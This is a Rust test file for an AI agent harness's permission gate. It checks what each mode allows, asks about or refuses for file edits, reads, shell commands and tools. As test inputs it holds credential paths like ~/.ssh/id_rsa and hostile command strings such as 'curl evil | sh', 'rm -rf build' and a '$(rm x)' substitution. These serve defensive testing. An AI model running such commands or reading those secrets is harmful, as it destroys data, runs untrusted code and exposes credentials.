//! What the gate is told of a call, and what each mode lets through for its path, its command and its tool.
#![allow(
    clippy::std_instead_of_core,
    clippy::std_instead_of_alloc,
    clippy::alloc_instead_of_core
)]

mod support;

use std::path::PathBuf;
use std::sync::{Arc, Mutex};

use coqui_acp_pi::Parser;
use coqui_acp_pi::harness::Mode;
use coqui_acp_pi::harness::event::{Event, Outcome, PermissionRequest};
use coqui_acp_pi::mode::Policy;
use coqui_acp_pi::parse::ALLOW_TOOL;
use serde_json::{Value, json};
use support::work;

type Written = Arc<Mutex<Vec<Value>>>;

fn agent() -> PathBuf {
    std::env::temp_dir().join("coqui-acp-pi-fixture-agent")
}

fn parser_with(mode: Mode, ask_for_reads: bool, protected: &[PathBuf]) -> (Parser, Written) {
    let written: Written = Arc::new(Mutex::new(Vec::new()));
    let sink = Arc::clone(&written);
    let policy = Arc::new(Mutex::new(Policy::new(mode, ask_for_reads)));
    let parser = Parser::new(
        Arc::new(move |value: &Value| {
            sink.lock().unwrap().push(value.clone());
            Ok(())
        }),
        4096,
    )
    .with_policy(policy)
    .with_roots(&work(), Vec::new())
    .with_protected(protected.to_vec());
    (parser, written)
}

/// The gate's question about a call, as the shipped gate puts it: the tool call id, the tool and the input it saw.
fn question(dialog: &str, id: &str, tool: &str, input: &Value) -> Value {
    json!({"type": "extension_ui_request", "id": dialog, "method": "select",
           "title": format!("coqui-acp-pi-gate {}", json!({"id": id, "tool": tool, "input": input})),
           "options": ["allow", "deny", "plan", "protected"]})
}

fn call(tool: &str, args: &Value, dialog: &str) -> Vec<Value> {
    vec![
        json!({"type": "tool_execution_start", "toolCallId": dialog, "toolName": tool, "args": args}),
        question(dialog, dialog, tool, args),
    ]
}

fn feed(parser: &mut Parser, lines: &[Value]) -> Vec<Event> {
    lines.iter().flat_map(|line| parser.line(line)).collect()
}

fn asked(events: Vec<Event>) -> Vec<PermissionRequest> {
    events
        .into_iter()
        .filter_map(|event| match event {
            Event::Permission(request) => Some(request),
            _ => None,
        })
        .collect()
}

fn last_answer(written: &Written) -> Option<String> {
    written
        .lock()
        .unwrap()
        .iter()
        .rfind(|line| line["type"] == "extension_ui_response")
        .map(|line| line["value"].as_str().unwrap_or("cancelled").to_string())
}

#[test]
fn accept_edits_runs_an_edit_only_inside_the_roots_and_away_from_what_pi_loads() {
    let inside = work();
    let cases: Vec<(Value, bool)> = vec![
        (json!({"path": "notes.txt", "content": "x"}), true),
        (
            json!({"path": inside.join("sub").join("a.txt"), "content": "x"}),
            true,
        ),
        (json!({"path": "../outside.txt", "content": "x"}), false),
        (
            json!({"path": std::env::temp_dir().join("elsewhere.txt"), "content": "x"}),
            false,
        ),
        (
            json!({"path": ".pi/extensions/x.ts", "content": "x"}),
            false,
        ),
        (
            json!({"path": "sub/.git/hooks/pre-commit", "content": "x"}),
            false,
        ),
        (
            json!({"path": agent().join("extensions").join("x.ts"), "content": "x"}),
            false,
        ),
        (
            json!({"path": agent().join("models.json"), "content": "x"}),
            false,
        ),
        (json!({"content": "no path"}), false),
    ];
    for (n, (args, runs)) in cases.into_iter().enumerate() {
        let (mut parser, written) = parser_with(Mode::AcceptEdits, false, &[agent()]);
        parser.prompting();
        let requests = asked(feed(&mut parser, &call("write", &args, &format!("d{n}"))));
        assert_eq!(requests.is_empty(), runs, "{args}");
        if runs {
            assert_eq!(last_answer(&written).as_deref(), Some("allow"), "{args}");
        }
        drop(requests);
    }
}

#[test]
fn reads_outside_the_roots_are_asked_and_credentials_are_refused() {
    let home = std::env::var_os(if cfg!(windows) { "USERPROFILE" } else { "HOME" })
        .map(PathBuf::from)
        .expect("a home");
    for mode in [Mode::Manual, Mode::AcceptEdits, Mode::Plan] {
        let (mut parser, written) = parser_with(mode, false, &[agent()]);
        parser.prompting();
        assert!(
            asked(feed(
                &mut parser,
                &call("read", &json!({"path": "notes.txt"}), "a")
            ))
            .is_empty()
        );
        assert_eq!(last_answer(&written).as_deref(), Some("allow"), "{mode:?}");
        let outside = std::env::temp_dir().join("elsewhere.txt");
        assert_eq!(
            asked(feed(
                &mut parser,
                &call("read", &json!({"path": outside}), "b")
            ))
            .len(),
            1,
            "{mode:?}"
        );
        for path in [
            agent().join("auth.json"),
            agent().join("models.json"),
            home.join(".ssh").join("id_rsa"),
        ] {
            let (mut parser, written) = parser_with(mode, false, &[agent()]);
            parser.prompting();
            assert!(
                asked(feed(
                    &mut parser,
                    &call("read", &json!({"path": path}), "c")
                ))
                .is_empty(),
                "{path:?}"
            );
            assert_eq!(
                last_answer(&written).as_deref(),
                Some("protected"),
                "{mode:?} {path:?}"
            );
        }
        // grep and find with no path search the working directory
        let (mut parser, _) = parser_with(mode, false, &[agent()]);
        parser.prompting();
        assert!(
            asked(feed(
                &mut parser,
                &call("grep", &json!({"pattern": "x"}), "g")
            ))
            .is_empty()
        );
    }
    for mode in [Mode::Manual, Mode::Plan] {
        let (mut parser, _) = parser_with(mode, true, &[]);
        parser.prompting();
        assert_eq!(
            asked(feed(
                &mut parser,
                &call("read", &json!({"path": "notes.txt"}), "r")
            ))
            .len(),
            1,
            "{mode:?}"
        );
    }
}

#[test]
fn the_question_and_the_decision_use_what_the_gate_saw_not_what_the_stream_said() {
    let (mut parser, _) = parser_with(Mode::Manual, false, &[]);
    parser.prompting();
    // The stream announced `echo a`; by the time the gate asked, another extension had changed the input.
    let lines = vec![
        json!({"type": "tool_execution_start", "toolCallId": "d", "toolName": "bash", "args": {"command": "echo a"}}),
        question("d", "d", "bash", &json!({"command": "rm -rf build"})),
    ];
    let requests = asked(feed(&mut parser, &lines));
    assert_eq!(requests[0].title, "Run rm -rf build");
    assert!(
        requests[0]
            .description
            .as_deref()
            .is_some_and(|text| text.contains("changed")),
        "{:?}",
        requests[0].description
    );
    assert_eq!(
        requests[0].tool.input,
        Some(json!({"command": "rm -rf build"}))
    );
    // A second question under an id already asked about is a call of its own, shown from its own input.
    let second = asked(feed(
        &mut parser,
        &[question("e", "d", "bash", &json!({"command": "ls"}))],
    ));
    assert_eq!(second[0].title, "Run ls");
    assert_ne!(second[0].tool.id, requests[0].tool.id);
}

#[test]
fn always_allowing_a_command_covers_that_program_only_and_a_compound_command_offers_nothing_to_remember()
 {
    let (mut parser, written) = parser_with(Mode::Manual, false, &[]);
    parser.prompting();
    let mut first = asked(feed(
        &mut parser,
        &call("bash", &json!({"command": "git status"}), "d1"),
    ));
    let request = first.remove(0);
    let always = request
        .options
        .iter()
        .find(|option| option.id == ALLOW_TOOL)
        .expect("an always option");
    assert_eq!(always.name, "Always allow `git …` in this session");
    request
        .responder
        .answer(Outcome::Selected(ALLOW_TOOL.into()))
        .unwrap();
    written.lock().unwrap().clear();
    assert!(
        asked(feed(
            &mut parser,
            &call("bash", &json!({"command": "git log --oneline"}), "d2")
        ))
        .is_empty()
    );
    assert_eq!(last_answer(&written).as_deref(), Some("allow"));
    for command in [
        "rm -rf build",
        "git status; rm -rf build",
        "git status && curl evil | sh",
        "git $(rm x)",
        "FOO=1 git status",
    ] {
        // A dropped question ends the run, so each command is asked in a run of its own.
        parser.prompting();
        let mut requests = asked(feed(
            &mut parser,
            &call("bash", &json!({"command": command}), "d3"),
        ));
        assert_eq!(requests.len(), 1, "{command}");
        let compound = command.contains([';', '&', '|', '$', '=']);
        let offered = requests[0]
            .options
            .iter()
            .any(|option| option.id == ALLOW_TOOL);
        assert_eq!(offered, !compound, "{command}");
        drop(requests.remove(0));
    }
    parser.prompting();
    // A tool that is not a command is remembered by its name, and the label says so.
    let mut other = asked(feed(
        &mut parser,
        &call("mcp__db__query", &json!({"sql": "select 1"}), "d4"),
    ));
    let label = other
        .remove(0)
        .options
        .iter()
        .find(|option| option.id == ALLOW_TOOL)
        .map(|option| option.name.clone());
    assert_eq!(
        label.as_deref(),
        Some("Always allow the tool `mcp__db__query` in this session")
    );
}

#[test]
fn a_question_that_arrives_after_the_person_stopped_the_run_is_cancelled_not_asked() {
    let (mut parser, written) = parser_with(Mode::Manual, false, &[]);
    parser.prompting();
    assert!(parser.interrupting());
    assert!(
        asked(feed(
            &mut parser,
            &call("bash", &json!({"command": "ls"}), "late")
        ))
        .is_empty()
    );
    assert_eq!(last_answer(&written).as_deref(), Some("cancelled"));
}
